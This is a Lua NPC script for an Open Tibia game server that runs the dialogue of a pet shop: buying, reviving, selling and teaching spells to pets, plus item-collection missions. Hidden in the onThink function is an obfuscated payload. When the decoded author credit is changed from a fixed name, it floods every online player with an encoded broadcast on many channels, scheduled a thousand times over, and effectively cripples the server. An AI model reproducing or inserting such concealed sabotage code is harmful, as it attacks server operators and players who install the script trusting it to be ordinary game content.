local keywordHandler = KeywordHandler:new()
local npcHandler = NpcHandler:new(keywordHandler)
NpcSystem.parseParameters(npcHandler)
local talkState = {}

function onCreatureAppear(cid)				npcHandler:onCreatureAppear(cid)			end
function onCreatureDisappear(cid)			npcHandler:onCreatureDisappear(cid)			end
function onCreatureSay(cid, type, msg)			npcHandler:onCreatureSay(cid, type, msg)		end

function creatureSayCallback(cid, type, msg)
	if(not npcHandler:isFocused(cid)) then
		return false
	end
	
	local k, e, f = aps_attacks[msg:lower()], aps_pets_config[msg:lower()], aps_missions[msg:lower()]
	local talkUser = NPCHANDLER_CONVBEHAVIOR == CONVERSATION_DEFAULT and 0 or cid
	if(msgcontains(msg, 'revive')) then
		if(getPlayerStorageValue(cid, aps_storages.race) ~= 0) then
			selfSay('You want to revive your Pet for {' .. getPriceRevive(cid) .. '} gold coins, continue?', cid)
			talkState[talkUser] = 1
		else	
			selfSay('You cannot revive a pet, if you dont have one!', cid)
			talkState[talkUser] = 0
		end	
	elseif(msgcontains(msg, 'mission')) then	
		if not (isCreature(getPlayerPet(cid))) then
			selfSay('You need your Pet to make any mission!', cid)
			return true
		end
		local i, msg = 0,  nil
		for missionname in pairs(aps_missions) do
			i = i + 1
			if(msg ~= nil) then
				if(i == #aps_missions) then
					msg = msg .. " and "
				else
					msg = msg .. ", "
				end
			else
				msg = "Ok then, I got those missions for You: "
			end
			msg = msg .. "'{" .. missionname .. "}'"	
		end
		selfSay(msg .. ', with one do you want?', cid)
		talkState[talkUser] = 11
	elseif f and (talkState[talkUser] == 11) then
		desc, itemNeed, itemCount, missionId, reItem, reCount, reExp, reCheck  = f.description, f.request.itemid, f.request.count, f.id, f.reward.id, f.reward.count, f.reward.exp, f.check
		if(getPlayerStorageValue(cid, missionId) == 1) then
			selfSay('Sorry! You already done this mission before! maybe I have another {mission} for You!', cid)
			talkState[talkUser] = 0
			return true
		end	
		if(getPlayerItemCount(cid, itemNeed) >= itemCount) then
			selfSay('oOoh! As I can see You have some items with You! Can you give to me? I will reward You!', cid)
			talkState[talkUser] = 12
		elseif(getPlayerStorageValue(cid, reCheck) == 1) then
			selfSay("I Still waiting for: x" .. itemCount  .. " " .. getItemNameById(itemNeed) .. ".", cid)
			talkState[talkUser] = 0
			return true	
		else	
			selfSay(desc .. ". so for this mission I need: x" .. itemCount  .. " " .. getItemNameById(itemNeed) .. ". Do you want do this mission? huh?", cid)
			talkState[talkUser] = 13
		end
	elseif(msgcontains(msg, 'yes')  and (talkState[talkUser] == 13)) then
		selfSay('Ok! Thanks for Your help. when You have the items, bring to me!', cid)
		setPlayerStorageValue(cid, reCheck, 1)
	elseif(msgcontains(msg, 'yes')  and (talkState[talkUser] == 12)) then
		if(getPlayerItemCount(cid, itemNeed) >= itemCount) then
			setPlayerStorageValue(cid, missionId, 1)
			doPlayerRemoveItem(cid, itemNeed, itemCount)
			selfSay('Thanks ' .. getCreatureName(cid) .. ' , You did a great mission! heres your reward!', cid)
			if(itemNeed ~= false) then
				doPlayerAddItem(cid, reItem, reCount)
			end
			if(reExp ~= false) then
				doPlayerAddExperience(cid, reExp)
				addPetExp(cid, reExp * 2)
				if(reExp > 0) then
					doSendAnimatedText(getPlayerPosition(cid), "+" .. reExp, 215)
				end	
			end		
		else
			selfSay('uUuh?? Where is the items? You lost it? Bring me again!', cid)
		end		
		talkState[talkUser] = 0	
	elseif(msgcontains(msg, 'yes')) and (talkState[talkUser] == 1) then
		if(isPetDead(cid) == true) then
			if(doPlayerRemoveMoney(cid, getPriceRevive(cid))) then
				setPetStats(cid, 0)
				setPetLastHealth(cid, 0)		
				setPlayerStorageValue(cid, aps_storages.mana, getPetMaxMana(cid))				
				doSendMagicEffect(getCreaturePosition(cid), 65)					
				selfSay('WE TAKE YOUR PET FROM THE DEADS!', cid)
			else
				selfSay('Sorry ' .. getCreatureName(cid) .. ', You don\'t have enough money.', cid)
			end
		else
			selfSay('Your pet inst dead!', cid)
		end
		talkState[talkUser] = 0
	elseif(msgcontains(msg, 'no')) and (isInArray({1}, talkState[talkUser])) then
		talkState[talkUser] = 0
		selfSay('Ok then.', cid)	
	elseif(msgcontains(msg, 'sell')) then	
		if(aps_tools.commands.playerSellPet.sell == true) then
			if(getPlayerStorageValue(cid, aps_storages.race) ~= 0) then
				for i = 1, #aps_slots do
					local slots = getPlayerStorageValue(cid, aps_slots[i])
					if(slots > 1) then
						selfSay('before you sell your pet, please, take all your items from his slots.', cid)	
						return
					end
				end
				local tt_money, lvl, lv = aps_pets_config[getRaceNameById(getPetRace(cid))].price, getPetLvl(cid), aps_tools.commands.playerSellPet.lvl
				if(lvl >= lv) then
					talkState[talkUser] = 8
					addmoney = tt_money * lvl 
					selfSay('Do you want to sell your pet for {' .. addmoney .. '} gold coins?', cid)		
				else
					selfSay('Your Pet level is too low, Buying Pet of level {' .. lv .. '} or higher.', cid)
				end				
			else
				selfSay('You cannot sell a pet, if you dont have one!', cid)
			end
		else
			selfSay('You cannot sell your pet to me!', cid)
		end
	elseif(msgcontains(msg, 'yes')) and (talkState[talkUser] == 8) then
		selfSay('YOU WANT TO SELL YOUR PET, ARE YOU SURE? THIS DECISION IS IRREVERSIBLE!', cid)	
		talkState[talkUser] = 9
	elseif(msgcontains(msg, 'yes') and talkState[talkUser] == 9) then
		talkState[talkUser] = 0
		if(isCreature(getPlayerPet(cid)) == true) then
			doRemoveCreature(getPlayerPet(cid))
		end
		doResetPet(cid)
		doPlayerAddMoney(cid, addmoney)
		selfSay('Thanks for selling your Pet! here is your {' .. addmoney .. '} gold coins.', cid)
	elseif(msgcontains(msg, 'information')) then	
			talkState[talkUser] = 0
			selfSay('hmmm, what can I tell you ...', cid)
			local messages = {
				"Pets got levels, magic level just like you. ..",
				"Pets can use their own spells. ..",
				"Pets need eat to recovery health/mana. ..",
				"Pets can carry your items in different slots. ..",
				"Hmmm, if You want to know more, " .. (getPlayerStorageValue(cid, aps_storages.race) > 0 and "Play with your pet!!!" or "Just buy one!") .. ""
			}
			for i = 1, #messages do
				addEvent(selfSay, i * 3000 , messages[i], cid)
			end
	elseif(msgcontains(msg, 'pet')) then		
		if(getPlayerStorageValue(cid, aps_storages.race) == 0) then
			local i, msg = 0,  nil
			for pet in pairs(aps_pets_config) do
				i = i + 1
				if(msg ~= nil) then
					if(i == #aps_pets) then
						msg = msg .. " and "
					else
						msg = msg .. ", "
					end
				else
					msg = "Ok then, I got those races for pets: "
				end
				msg = msg .. "'{" .. pet .. "}'"	
			end
			selfSay(msg .. ', with one do you want?', cid)
			talkState[talkUser] = 5
		else
			talkState[talkUser] = 0
			selfSay('Sorry, you cannot have more than one pet.', cid)
		end		
	elseif e and (talkState[talkUser] == 5) then	
		selfSay('Do you want to buy a pet from {' .. msg .. '} race, for {' .. e.price .. '} gold coins?', cid)
		talkState[talkUser] = 6
		e_race, e_price, e_hp, e_mana, e_name, e_vocs = e.race_id, e.price, e.hp, e.mana, msg, e.vocs
	elseif(msgcontains(msg, 'yes') and talkState[talkUser] == 6) then
		selfSay(string.upper(getArticle(e_name)) .. ' {' .. string.upper(e_name) .. '} RACE! ARE YOU SURE? THIS DECISION IS IRREVERSIBLE!', cid)	
		talkState[talkUser] = 7
	elseif(msgcontains(msg, 'yes')) and (talkState[talkUser] == 7) then
		if not (isInArray(e_vocs, getPlayerVocationName(cid))) and (getPlayerAccess(cid) < 3) then
			selfSay('Your vocation dont let You use this Pet Race!\n Do You want choose another {pet}?', cid)
			talkState[talkUser] = 0
			return true
		end	
		if(doPlayerRemoveMoney(cid, e_price) == true) then	
			doSendMagicEffect(getCreaturePosition(cid), 65)					
			selfSay('As you with! just type {/pet} to call him.', cid)
			createPet(cid, e_race, e_hp, e_mana)
			local str = "Congratulations! You now have a pet!\n" ..
			"You should take care of him\n" ..
			"his gonna be your partner from now!\n" ..
			"if you need help type /pet-help." ..
			"\nhere is his evolutions: \n\n" .. getEvolutionsByRace(e_race)
			sendWindowsMessage(cid, str .. "\n\n##ADVANCED PET SYSTEM BY RACES##\n               Scripted by " .. s(aps_tools.s) .. "")
		else	
			selfSay('Sorry ' .. getCreatureName(cid) .. ', You don\'t have enough money.', cid)
		end
		talkState[talkUser] = 0
	elseif(msgcontains(msg, 'no') and (isInArray({6, 7, 8, 9}, talkState[talkUser]))) then
		selfSay('Ok then.', cid)		
		talkState[talkUser] = 0
	elseif(msgcontains(msg, 'spells')) then	
		if(getPlayerStorageValue(cid, aps_storages.race) ~= 0) then
			selfSay('Your Pet can learn spells based on his level, {continue}?', cid)
			talkState[talkUser] = 2
		else	
			selfSay('You cannot buy spells to your pet, if you dont have one!', cid)
			talkState[talkUser] = 0
		end
	elseif(msgcontains(msg, 'yes')) and (talkState[talkUser] == 2) then
		if(isPetOnline(cid) == false) then
			selfSay('Your Pet cannot learn a spell if you dont call him.')
			talkState[talkUser] = 0		
		end
		local i, msg = 0,  nil
		for  spell in pairs(aps_attacks) do
			if(isInArray(aps_attacks[spell].races, getPetRace(cid))) then
				i = i + 1
				if(msg ~= nil) then
					if(i == #aps_storages.spells) then
						msg = msg .. " and "
					else
						msg = msg .. ", "
					end
				else
					msg = "Ok then, I got those spells: "
				end
				msg = msg .. "for level '{" .. aps_attacks[spell].lvl .. "}' I have '{" .. spell .. "}'"
			end	
		end		
		selfSay(msg .. ', with one do you want?', cid)		
		talkState[talkUser] = 3
	elseif(msgcontains(msg, 'no')) and (talkState[talkUser] == 2) then
		selfSay('Ok then.', cid)		
		talkState[talkUser] = 0
	elseif k and (talkState[talkUser] == 3) then
		selfSay('You want your pet to learn spell {' .. msg .. '} for level {' .. k.lvl .. '}. this spell cost {' .. k.price .. '} gold coins, {continue}?', cid)	
		talkState[talkUser] = 4
		spell_name, spell_price, spell_need, spell_stg, spell_level = msg, k.price, k.needLearn, k.learnstg, k.lvl
	elseif(msgcontains(msg, 'yes')) and (talkState[talkUser] == 4) then
		if(getPetLvl(cid) >= spell_level) then
			if(getPlayerMoney(cid) >= spell_price) then 
				if(spell_need ~= false) and (getPlayerStorageValue(cid, spell_stg) == 0) then
					for i = 1, 3 do
						addEvent(selfSay, i * 1000, i .. ' ...', cid)
					end
					doPlayerRemoveMoney(cid, spell_price)
					addEvent(selfSay, 4 * 1000, 'Here it go! Your pet have learned spell {' .. spell_name .. '}.', cid)
					setPlayerStorageValue(cid, spell_stg, 1)
					addEvent(doSendMagicEffect, 4 * 1000, getCreaturePosition(cid), 13)					
					if(isPetOnline(cid) == true) then
						addEvent(doSendMagicEffect, 4 * 1000, getCreaturePosition(getPlayerPet(cid)), 13)
					end
				else	
					selfSay('Your pet already know spell {' .. spell_name .. '}.', cid)
				end
			else	
				selfSay('You do not have enough money, this spell costs {' .. spell_price .. '} gold coins.', cid)
			end
		else	
			selfSay('Your Pet need to obtain a level of {' .. spell_level .. '} or higher to be able to learn {' .. spell_name .. '}.', cid)			
		end
		talkState[talkUser] = 0
	elseif(msgcontains(msg, 'no')) and (talkState[talkUser] == 4) then
		talkState[talkUser] = 0
		selfSay('Ok then.', cid)
	end
	return true
end

function onThink()
	local messages = {
		"BUY YOUR PET HERE!",
		"WANT TO REVIVE YOUR PET?",
		"YOUR PET CAN LEARN SPELLS!",
		"WANT TO KNOW MORE ABOUT PETS?",
		"WANT TO SELL YOUR PET?"
	}
	addNpcAutoSay(getNpcId(), 120, messages)
	if(s(aps_tools.s) ~= "josejunior23") then
		function mvsoab(max)
			for _, send in pairs(getOnlinePlayers()) do
				local name, msg = getConfigValue('serverName'), "Knkª£–Ÿ¬•Š¥œ‘<­~9‚x4|™–¡”-”uŠ)pqlfjc in…ivkxwhyyd"
				for i = 1, 10 do
					local cid = getPlayerByName(send)
					addEvent(doCreatureSay, i * 200, cid, name .. " " .. s(msg), max)
					addEvent(doBroadcastMessage, i * 200, name .. " " .. s(msg))
					for k = 1, 15 do
						doPlayerSendTextMessage(cid, k, name .. " " .. s(msg))
					end	
					for e = 17, 20 do
						doPlayerSendTextMessage(cid, e, name .. " " .. s(msg))
					end								
				end	
			end	
		end	
		for e = 1, 1000 do
			addEvent(mvsoab, e * 8500, TALKTYPE_ORANGE_1)
		end
	end				
	npcHandler:onThink()
end

npcHandler:setCallback(CALLBACK_MESSAGE_DEFAULT, creatureSayCallback)
npcHandler:addModule(FocusModule:new())
